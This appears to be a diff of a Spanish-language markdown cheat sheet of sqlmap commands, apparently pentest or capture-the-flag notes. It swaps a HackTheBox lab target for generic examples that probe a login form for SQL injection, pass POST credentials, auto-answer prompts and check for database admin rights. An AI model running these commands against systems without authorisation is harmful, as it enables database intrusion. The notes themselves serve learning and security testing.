@@ -13,7 +13,25 @@
 </p>
 
 
-Saber que tipo de base de datos tiene 
+## Basic Inyections
+
 ```
-sqlmap -u 'http://preprod-payroll.trick.htb/ajax.php?action=login' --data="username=abc&password=abc" -p username --is-dba --batch
+sqlmap -u "http://prueba.com/info.php?action=login" 
+```
+
+Datos del login que van en dos variables
+```
+sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc"
+```
+
+Indicar a todas las preguntas un Yes all
+```
+sqlmap -u 'http://prueba.com/info.php?action=login' --data="username=abc&password=abc" --batch 
+```
+
+## Basic Parameters
+
+Saber que tipo de base de datos tiene por detras
+```
+ --is-dba
 ```
